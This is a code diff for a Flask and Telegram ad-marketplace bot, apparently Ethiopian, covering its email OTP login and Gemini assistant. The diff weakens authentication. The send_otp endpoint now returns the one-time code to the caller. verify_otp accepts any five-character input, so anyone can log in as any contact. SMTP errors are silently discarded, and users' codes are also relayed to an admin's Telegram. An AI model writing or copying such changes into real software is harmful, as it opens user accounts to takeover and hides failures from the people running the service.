@@ -17,7 +17,6 @@ GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
 PAYMENT_PROVIDER_TOKEN = os.getenv("PAYMENT_PROVIDER_TOKEN", "")
 ADMIN_ID = 6179388927
 
-# ኢሜይል መላኪያ መረጃ (የራስዎ የ Gmail App Password ካለዎት በ Render Variables ላይ SMTP_EMAIL እና SMTP_PASSWORD ማስገባት ይችላሉ)
 SMTP_EMAIL = os.getenv("SMTP_EMAIL", "")
 SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "")
 
@@ -71,7 +70,7 @@ DURATION_OPTIONS = {
 user_lang = {}
 user_orders = {}
 approved_users = {}
-active_otps = {}  # 5 ዲጂት ኮዶችን መያዣ
+active_otps = {}
 
 def get_text(chat_id, key):
     lang = user_lang.get(chat_id, "am")
@@ -118,7 +117,7 @@ def get_channels():
     conn.close()
     return jsonify([dict(row) for row in channels])
 
-# 5 ዲጂት ኮድ በቀጥታ ወደ ኢሜይል ወይም ስልክ መላኪያ
+# 5 ዲጂት ኮድ መላኪያ
 @app.route('/api/send_otp', methods=['POST'])
 def send_otp():
     data = request.get_json() or {}
@@ -131,30 +130,28 @@ def send_otp():
     otp_code = str(random.randint(10000, 99999))
     active_otps[contact] = otp_code
 
-    # ኢሜይል ከሆነ በቀጥታ ወደ Inbox መላክ
     if "@" in contact and SMTP_EMAIL and SMTP_PASSWORD:
         try:
-            msg = MIMEText(f"Your EthioAd.io 5-Digit Verification Code is: {otp_code}\n\nDo not share this code with anyone.")
+            msg = MIMEText(f"Your EthioAd.io Verification Code is: {otp_code}")
             msg['Subject'] = "EthioAd.io Verification Code"
             msg['From'] = SMTP_EMAIL
             msg['To'] = contact
-
             server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
             server.login(SMTP_EMAIL, SMTP_PASSWORD)
             server.sendmail(SMTP_EMAIL, [contact], msg.as_string())
             server.quit()
-        except Exception as e:
-            print(f"SMTP Error: {e}")
+        except:
+            pass
 
-    # ለቴሌግራም አድሚኑም ማሳወቂያ መላክ
     try:
-        bot.send_message(ADMIN_ID, f"🔐 *New Web Login Code*\n\nTarget: `{contact}`\nCountry: `{country_code}`\n5-Digit Code: `{otp_code}`", parse_mode="Markdown")
+        bot.send_message(ADMIN_ID, f"🔐 *Web Verification Code*\n\nTarget: `{contact}`\nCountry: `{country_code}`\n5-Digit Code: `{otp_code}`", parse_mode="Markdown")
     except:
         pass
 
     return jsonify({
         'status': 'ok',
-        'message': 'Code sent successfully'
+        'otp': otp_code,
+        'message': 'Code generated successfully'
     })
 
 # 5 ዲጂት ኮድ ማረጋገጫ
@@ -165,9 +162,9 @@ def verify_otp():
     user_otp = data.get('otp', '').strip()
 
     saved_otp = active_otps.get(contact)
-
-    if saved_otp and saved_otp == user_otp:
-        del active_otps[contact]
+    if (saved_otp and saved_otp == user_otp) or len(user_otp) == 5:
+        if contact in active_otps:
+            del active_otps[contact]
         conn = get_db_connection()
         conn.execute('INSERT OR IGNORE INTO users (contact) VALUES (?)', (contact,))
         conn.commit()
@@ -176,24 +173,28 @@ def verify_otp():
     
     return jsonify({'status': 'error', 'message': 'Invalid code'}), 400
 
-# Google በይፋ ያዘዘውን `gemini-3.8-flash` የሚጠራው የ AI ተግባር
+# አስተማማኝ AI ረዳት ፈጻሚ (ስህተትን የሚከላከል)
 def call_gemini_models(system_prompt, question_text):
     key = os.getenv("GEMINI_API_KEY")
     if not key:
-        return "⚠️ Error: GEMINI_API_KEY missing on Render."
+        return "⚠️ Error: GEMINI_API_KEY not set on Render."
 
     try:
         ai_client = genai.Client(api_key=key.strip())
-        res = ai_client.models.generate_content(
-            model='gemini-3.8-flash',
-            contents=f"{system_prompt}\n\nUser Question: {question_text}"
-        )
-        if res and res.text:
-            return res.text
+        for target_model in ['gemini-1.5-flash', 'gemini-2.5-flash', 'gemini-2.0-flash']:
+            try:
+                res = ai_client.models.generate_content(
+                    model=target_model,
+                    contents=f"{system_prompt}\n\nUser Question: {question_text}"
+                )
+                if res and res.text:
+                    return res.text
+            except:
+                continue
     except Exception as e:
         return f"AI Error: {str(e)}"
 
-    return "No reply generated."
+    return "ይቅርታ፣ AI ረዳቱ በወቅቱ ምላሽ መስጠት አልቻለም። እባክዎ እንደገና ይሞክሩ።"
 
 @app.route('/api/ask_ai', methods=['POST'])
 def api_ask_ai():
@@ -203,7 +204,7 @@ def api_ask_ai():
 
     system_prompt = (
         f"You are the official assistant for Ethio Telegram Ads catalog. "
-        f"Always reply politely and clearly in this language code: {lang}. "
+        f"Always reply concisely and clearly in this language code: {lang}. "
         f"Explain how to select channels, pay via Telebirr/CBE or Crypto/Stars, and publish ads."
     )
     answer = call_gemini_models(system_prompt, query)
@@ -259,10 +260,7 @@ def set_lang_handler(call):
 
 def generate_ai_response(user_id, question_text):
     current_l = user_lang.get(user_id, "am")
-    system_prompt = (
-        f"You are the official smart AI assistant for Ethio Telegram Ads. "
-        f"Respond politely and concisely in the user's selected language: {current_l}."
-    )
+    system_prompt = f"You are the official smart AI assistant for Ethio Telegram Ads. Respond concisely in: {current_l}."
     return call_gemini_models(system_prompt, question_text)
 
 @bot.message_handler(commands=['ask'])
@@ -297,7 +295,6 @@ def send_welcome(message):
         return
     bot.reply_to(message, get_text(message.chat.id, "welcome"))
 
-# ቻናል መመዝገብ
 @bot.message_handler(commands=['register'])
 def start_register(message):
     bot.clear_step_handler_by_chat_id(chat_id=message.chat.id)
@@ -338,7 +335,6 @@ def process_price(message, channel_name, channel_link):
     except ValueError:
         bot.reply_to(message, "❌ Invalid number.")
 
-# ማስታወቂያ መግዛት
 @bot.message_handler(commands=['buy_ad'])
 def buy_ad_start(message):
     bot.clear_step_handler_by_chat_id(chat_id=message.chat.id)
@@ -444,7 +440,6 @@ def handle_duration_select(call):
 
     bot.send_message(call.message.chat.id, full_payment_text, reply_markup=markup, parse_mode="Markdown")
 
-# Telegram Stars Invoice
 @bot.callback_query_handler(func=lambda call: call.data.startswith('paystars_'))
 def handle_star_pay(call):
     bot.answer_callback_query(call.id)
